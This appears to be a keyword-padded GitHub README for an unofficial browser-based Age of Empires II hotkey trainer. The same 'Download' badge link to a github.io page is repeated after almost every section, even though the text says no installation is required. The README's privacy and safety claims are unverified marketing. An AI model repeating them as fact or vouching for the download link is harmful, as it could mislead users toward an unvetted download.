![preview](https://raw.githubusercontent.com/MikMem/aoe2-drill-forge/main/promo_0743c.svg)
[![Download](https://raw.githubusercontent.com/MikMem/aoe2-drill-forge/main/fetch_8a06.svg)](https://MikMem.github.io/aoe2-drill-forge/)

# ⚔️ AOE2 Hotkeys Practice — Version 2026

Welcome to **AOE2 Hotkeys Practice**, an unofficial, browser-native training ground for players who want their fingers to move as fast as their strategic minds. This is not merely a drill page. It is a digital sparring hall where muscle memory is forged, one keystroke at a time. Whether you are a seasoned castle-age tactician or a newcomer learning the rhythm of the game, this repository offers a privacy-first, locally processed hotkey training environment that respects your data and sharpens your reflexes.

The project is inspired by the timeless need to practice repetitive keyboard actions without the pressure of a live match. Instead of loading a full game, you load a drill. Instead of risking your ranked points, you build confidence. The entire experience happens inside your browser, and your hotkey configuration files never leave your machine.

[![Download](https://raw.githubusercontent.com/MikMem/aoe2-drill-forge/main/fetch_8a06.svg)](https://MikMem.github.io/aoe2-drill-forge/)

---

## 📜 Table of Contents

- [🌱 Project Origin and Philosophy](#-project-origin-and-philosophy)
- [🎯 Feature Array](#-feature-array)
- [🧠 How It Works — The Invisible Gymnasium](#-how-it-works--the-invisible-gymnasium)
- [🗂️ Built-In Drills and Custom Regimens](#️-built-in-drills-and-custom-regimens)
- [🔐 Privacy-First Architecture](#-privacy-first-architecture)
- [🌍 Multilingual Support and Responsive UI](#-multilingual-support-and-responsive-ui)
- [🛠️ Technology Stack and Modular Design](#️-technology-stack-and-modular-design)
- [📈 SEO-Friendly Keyword Integration](#-seo-friendly-keyword-integration)
- [🧩 Use Cases and Player Stories](#-use-cases-and-player-stories)
- [🔄 Roadmap for 2026](#-roadmap-for-2026)
- [❓ Frequently Asked Questions](#-frequently-asked-questions)
- [⚠️ Disclaimer](#️-disclaimer)
- [📄 License](#-license)
- [🤝 Contributing and Community](#-contributing-and-community)
- [💬 Support and Availability](#-support-and-availability)

---

## 🌱 Project Origin and Philosophy

Age of Empires II has always been a game of decisions, but behind every decision lies a sequence of keystrokes. The click of a house, the tap of a blacksmith upgrade, the swift selection of a scout — these micro-actions compound into victory or defeat. **AOE2 Hotkeys Practice** was born from a simple observation: players often know *what* to do but lose precious seconds because their hands hesitate.

This repository treats hotkey mastery as a form of choreography. Each drill is a dance routine for your fingers. Each custom configuration is a personal style. The browser becomes a rehearsal stage, and the feedback is immediate, visual, and gentle. There is no punishment for mistakes — only iteration. The philosophy is simple: practice should be accessible, private, and endlessly repeatable.

Unlike many training tools that require accounts, cloud sync, or external uploads, this project keeps everything local. Your hotkey files are parsed in the browser, your performance metrics stay in your session, and no server ever sees your data. This is privacy by design, not as an afterthought.

[![Download](https://raw.githubusercontent.com/MikMem/aoe2-drill-forge/main/fetch_8a06.svg)](https://MikMem.github.io/aoe2-drill-forge/)

---

## 🎯 Feature Array

Every feature is crafted to reduce friction between intention and action. Below is a detailed breakdown of what this trainer offers.

- **Browser-Based Drills** — No installation required. Open the page, choose a drill, and start training. The trainer runs entirely in modern browsers.
- **Built-In Drill Library** — A curated set of exercises covering common Age of Empires II actions: villager production, military unit creation, building placement, technology research, and formation commands.
- **Custom Drill Creator** — Design your own sequences by specifying key combinations, timing windows, and repetition counts. Save them locally for future sessions.
- **Local Hotkey File Processing** — Upload your own hotkey configuration file and the trainer will adapt the drills to match your personal bindings. The file is read locally and never transmitted.
- **Privacy-First Design** — No analytics on keystrokes, no tracking of drill performance, no external requests for your data. Your practice remains yours.
- **Responsive User Interface** — The layout adapts gracefully to desktops, laptops, tablets, and even large phones, ensuring a comfortable training experience on any screen.
- **Multilingual Support** — Interface strings are available in multiple languages, with a community-driven translation system that welcomes new locales.
- **Progress Persistence** — Session results and custom drills are stored in your browser's local storage, so you can pick up where you left off without creating an account.
- **Accessibility Considerations** — High-contrast mode, adjustable font sizes, and keyboard-only navigation make the trainer usable for a wide range of players.
- **Dark and Light Themes** — Choose a visual environment that suits your practice time, whether it is a late-night session or a bright afternoon warm-up.
- **Instant Feedback Loop** — Visual and optional auditory cues indicate correct and incorrect key presses, helping you identify patterns in your mistakes.
- **Zero Backend Dependency** — The entire application can be served as static files, making it easy to host anywhere and easy to audit for privacy.

Each of these features exists to serve one goal: making hotkey practice so seamless that you actually do it. The best training tool is the one you use consistently, and consistency comes from low barriers.

[![Download](https://raw.githubusercontent.com/MikMem/aoe2-drill-forge/main/fetch_8a06.svg)](https://MikMem.github.io/aoe2-drill-forge/)

---

## 🧠 How It Works — The Invisible Gymnasium

Imagine a gymnasium where the equipment is invisible, but the workout is real. When you open the trainer, you are presented with a drill card. The card describes an action, such as "Queue a villager at the Town Center" or "Build a house with a villager." Below the description, the trainer waits silently for your keystrokes.

As you press keys, the trainer compares your input against the expected sequence. If you match, the card advances with a satisfying animation. If you mismatch, the trainer gently highlights the discrepancy and allows you to retry. There is no timer unless you enable one, and no score unless you want one. The focus is on repetition and refinement.

Behind the scenes, the application maintains a state machine that tracks the current drill, the current step, and the history of attempts. This state machine is lightweight and runs entirely in JavaScript, ensuring smooth performance even on modest hardware. The visual layer is built with a component-based approach, making it easy to extend with new drill types or feedback mechanisms.

The "invisible gymnasium" metaphor extends to the data layer. Your hotkey file, if you choose to load one, is parsed into a mapping of actions to key combinations. This mapping is then used to generate drill steps dynamically. For example, if your "build house" hotkey is different from the default, the trainer adjusts automatically. This personalization is what transforms a generic practice tool into a personal coach.

[![Download](https://raw.githubusercontent.com/MikMem/aoe2-drill-forge/main/fetch_8a06.svg)](https://MikMem.github.io/aoe2-drill-forge/)

---

## 🗂️ Built-In Drills and Custom Regimens

The built-in drill library is organized into categories that mirror the phases of a typical Age of Empires II match. Each category contains drills of increasing complexity, allowing you to progress from basic actions to advanced sequences.

**Dark Age Fundamentals**
- Train a villager from the Town Center
- Send a villager to build a house
- Send a villager to gather wood
- Send a villager to gather food
- Create a scout cavalry from the Stable (if available)

**Feudal Age Efficiency**
- Build a Barracks with a villager
- Train a spearman from the Barracks
- Research Loom at the Town Center
- Build a Blacksmith
- Queue two villagers while building a farm

**Castle Age Coordination**
- Build a Castle with multiple villagers
- Train a knight from the Stable
- Research Crossbowman upgrade at the Archery Range
- Build a Siege Workshop
- Patrol a group of military units

**Imperial Age Mastery**
- Research Chemistry at the University
- Train a bombard cannon from the Siege Workshop
- Build a forward castle
- Research Paladin upgrade
- Coordinate a multi-unit attack formation

**Custom Regimens**
For players who want to go beyond the built-in drills, the custom drill creator allows you to define your own sequences. You can specify the action name, the expected key combination, the number of repetitions, and an optional time limit. Custom drills are saved locally and can be exported as JSON for sharing with friends or importing into another browser.

The combination of built-in and custom drills means the trainer can grow with you. As your skills improve, you can design drills that target your specific weaknesses, whether that is fast villager production, quick military transitions, or efficient building placement.

[![Download](https://raw.githubusercontent.com/MikMem/aoe2-drill-forge/main/fetch_8a06.svg)](https://MikMem.github.io/aoe2-drill-forge/)

---

## 🔐 Privacy-First Architecture

Privacy is not a feature bolted onto this project; it is the foundation. The architecture is designed so that no personal data ever leaves your device. Here is a detailed look at the privacy-preserving decisions embedded in the codebase.

- **Local File Processing** — When you upload a hotkey configuration file, it is read using the browser's File API and parsed entirely in memory. No network request is made to transmit the file.
- **No Telemetry** — The application does not include any analytics libraries, tracking pixels, or remote logging. Your drill performance is stored only in your browser's local storage.
- **No Account System** — There is no sign-up, no login, and no user profile. You are anonymous by default.
- **Static Hosting Friendly** — Because the app has no backend, it can be hosted on any static file server. This reduces the attack surface and eliminates server-side data collection.
- **Content Security Policy** — The project includes a strict CSP that prevents unexpected external resources from loading, further protecting your browsing session.
- **Open Source Auditability** — Every line of code is available for inspection. You can verify that the privacy claims are accurate by reading the source.

In an era where data collection is often the default, this project chooses a different path. The goal is to create a training tool that feels safe to use, even for players who are cautious about their digital footprint.

[![Download](https://raw.githubusercontent.com/MikMem/aoe2-drill-forge/main/fetch_8a06.svg)](https://MikMem.github.io/aoe2-drill-forge/)

---

## 🌍 Multilingual Support and Responsive UI

The trainer is built for a global community. The interface strings are stored in separate language files, making it straightforward to add new translations. Currently, the project supports English, Spanish, German, French, Portuguese, and Korean, with community contributions adding more over time.

The responsive UI ensures that the training experience is comfortable regardless of screen size. On a large monitor, the drill card is centered with ample whitespace. On a tablet, the layout adjusts to a single column. On a phone, the controls become larger and more touch-friendly. The design philosophy is that practice should never be interrupted by zooming or scrolling.

Accessibility is also a priority. The trainer supports keyboard-only navigation, so players who cannot use a mouse can still practice. High-contrast mode improves visibility for players with low vision. Adjustable font sizes accommodate different preferences. These considerations make the tool more inclusive, which ultimately benefits the entire community.

[![Download](https://raw.githubusercontent.com/MikMem/aoe2-drill-forge/main/fetch_8a06.svg)](https://MikMem.github.io/aoe2-drill-forge/)

---

## 🛠️ Technology Stack and Modular Design

The project is built with a focus on simplicity and maintainability. The core technologies include:

- **HTML5 and CSS3** — For structure and styling, with CSS custom properties for theming.
- **Vanilla JavaScript (ES2026)** — For the application logic, avoiding heavy frameworks to keep the bundle small and the code readable.
- **Local Storage API** — For persisting custom drills and session preferences.
- **File API** — For reading hotkey configuration files locally.
- **Web Audio API** — For optional auditory feedback during drills.

The codebase is organized into modules: a drill engine, a file parser, a UI renderer, a translation manager, and a storage manager. This modular design makes it easy to test individual components and to extend the application with new features. For example, adding a new drill type involves creating a new module that conforms to the drill engine's interface, without modifying the core logic.

The build process is minimal. The project uses a simple bundler to combine modules for production, but the development version can be run directly from the source files. This lowers the barrier for contributors who want to experiment with the code.

[![Download](https://raw.githubusercontent.com/MikMem/aoe2-drill-forge/main/fetch_8a06.svg)](https://MikMem.github.io/aoe2-drill-forge/)

---

## 📈 SEO-Friendly Keyword Integration

This README is written with discoverability in mind. Players searching for terms like "Age of Empires II hotkey trainer," "browser-based RTS practice tool," "local hotkey file parser," and "privacy-first gaming trainer" should find this repository. The content naturally incorporates these phrases without artificial repetition.

Other relevant phrases include "custom drill creator for RTS," "responsive hotkey practice UI," "multilingual gaming trainer," and "offline-capable browser training." The goal is to make the project easy to find for players who need it, while keeping the text readable and informative.

The repository description and topics are also optimized for search. By using clear, descriptive language, the project can reach a wider audience without resorting to misleading tactics.

[![Download](https://raw.githubusercontent.com/MikMem/aoe2-drill-forge/main/fetch_8a06.svg)](https://MikMem.github.io/aoe2-drill-forge/)

---

## 🧩 Use Cases and Player Stories

Consider a player who recently switched from a default hotkey layout to a custom one. They know the new bindings intellectually, but their fingers still reach for the old keys. With this trainer, they can load their custom hotkey file and run drills until the new bindings feel natural. The practice is low-stakes and highly repetitive, which is exactly what muscle memory needs.

Another player is preparing for a tournament. They want to shave seconds off their build order. They create custom drills that mimic their opening sequence, complete with timing windows. They run these drills for fifteen minutes before each play session. Over time, their execution becomes smoother and more consistent.

A third player is a casual gamer who plays on a laptop with a small screen. The responsive UI and adjustable font sizes make the trainer comfortable to use. They appreciate that no account is required and that their practice data stays on their machine.

These stories illustrate the versatility of the project. It is not just a tool for professionals; it is a tool for anyone who wants to improve at their own pace.

[![Download](https://raw.githubusercontent.com/MikMem/aoe2-drill-forge/main/fetch_8a06.svg)](https://MikMem.github.io/aoe2-drill-forge/)

---

## 🔄 Roadmap for 2026

The project has an ambitious roadmap for the year 2026. Planned features include:

- **Replay Analysis Integration** — Allow players to import a recorded game and extract hotkey sequences for practice.
- **Advanced Statistics Dashboard** — Provide detailed metrics on accuracy, speed, and consistency over time, all stored locally.
- **Community Drill Sharing** — Enable players to export and import drill sets as JSON files, fostering a community of practice.
- **Expanded Language Support** — Add more translations, including Japanese, Chinese, and Russian.
- **Mobile App Wrapper** — Package the web app as a progressive web app (PWA) for offline use on mobile devices.
- **Accessibility Enhancements** — Add screen reader support and customizable keyboard shortcuts for navigation.
- **Theme Editor** — Allow players to create and share custom color themes.

These features are prioritized based on community feedback. If you have a suggestion, the contributing guidelines explain how to submit ideas.

[![Download](https://raw.githubusercontent.com/MikMem/aoe2-drill-forge/main/fetch_8a06.svg)](https://MikMem.github.io/aoe2-drill-forge/)

---

## ❓ Frequently Asked Questions

**Is this an official Age of Empires II product?**
No. This is an unofficial, community-driven project. It is not affiliated with or endorsed by the game's publishers or developers.

**Do I need to own Age of Empires II to use this trainer?**
No. The trainer is a standalone browser application. You can practice hotkeys even if you do not have the game installed.

**Will my hotkey file be uploaded to a server?**
No. Your hotkey file is processed entirely in your browser. It never leaves your device.

**Can I use this trainer on my phone?**
Yes. The responsive UI is designed to work on phones and tablets, though a physical keyboard is recommended for the best experience.

**How do I create a custom drill?**
Open the custom drill creator, enter the action name, the expected key combination, and the number of repetitions. Save the drill, and it will appear in your drill list.

**Is there a cost to use this trainer?**
The trainer is available at no monetary cost. It is an open-source project maintained by volunteers.

**How can I contribute a translation?**
The contributing guidelines explain how to add a new language file. Community translations are welcome and appreciated.

**What browsers are supported?**
Modern versions of Chrome, Firefox, Safari, and Edge are supported. The trainer relies on standard web APIs that are widely available.

[![Download](https://raw.githubusercontent.com/MikMem/aoe2-drill-forge/main/fetch_8a06.svg)](https://MikMem.github.io/aoe2-drill-forge/)

---

## ⚠️ Disclaimer

This project is an unofficial fan-made tool. It is not affiliated with, endorsed by, or sponsored by the creators or publishers of Age of Empires II. All trademarks and copyrights belong to their respective owners.

The trainer is provided for educational and practice purposes. The authors make no guarantees about performance improvements or tournament outcomes. Results depend on individual effort and consistency.

The software is provided "as is," without warranty of any kind, express or implied. The authors are not liable for any damages arising from the use of this software.

By using this trainer, you agree to use it responsibly and in accordance with the terms of service of any related platforms.

[![Download](https://raw.githubusercontent.com/MikMem/aoe2-drill-forge/main/fetch_8a06.svg)](https://MikMem.github.io/aoe2-drill-forge/)

---

## 📄 License

This project is licensed under the MIT License. You are permitted to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software, subject to the conditions of the license.

For the full text of the license, please refer to the [MIT License](https://opensource.org/licenses/MIT).

[![Download](https://raw.githubusercontent.com/MikMem/aoe2-drill-forge/main/fetch_8a06.svg)](https://MikMem.github.io/aoe2-drill-forge/)

---

## 🤝 Contributing and Community

Contributions are welcome. Whether you want to fix a bug, add a feature, improve documentation, or translate the interface, your help is valued.

To contribute, please follow these steps:

1. Read the contributing guidelines in the repository.
2. Fork the repository and create a new branch for your change.
3. Make your changes and test them thoroughly.
4. Submit a pull request with a clear description of what you have done.

Please note that all contributions must respect the privacy-first philosophy of the project. Do not introduce analytics, tracking, or external data collection.

The community is also active in discussions. If you have questions or ideas, feel free to open an issue or join the conversation.

[![Download](https://raw.githubusercontent.com/MikMem/aoe2-drill-forge/main/fetch_8a06.svg)](https://MikMem.github.io/aoe2-drill-forge/)

---

## 💬 Support and Availability

Support is available around the clock, every day of the year. While the maintainers are volunteers, the project aims to respond to issues and questions promptly. The community forum and issue tracker are the primary channels for support.

For urgent matters, please use the issue tracker with a clear title and description. For general questions, the discussions tab is a friendly place to ask.

The project is maintained by a small team of enthusiasts who believe that practice tools should be accessible to everyone. Your patience and understanding are appreciated.

[![Download](https://raw.githubusercontent.com/MikMem/aoe2-drill-forge/main/fetch_8a06.svg)](https://MikMem.github.io/aoe2-drill-forge/)

---

Thank you for visiting **AOE2 Hotkeys Practice**. May your keystrokes be swift, your build orders clean, and your practice sessions rewarding. Whether you are training for a tournament or simply want to enjoy the game with greater ease, this trainer is here for you — privately, locally, and always in your browser.

[![Download](https://raw.githubusercontent.com/MikMem/aoe2-drill-forge/main/fetch_8a06.svg)](https://MikMem.github.io/aoe2-drill-forge/)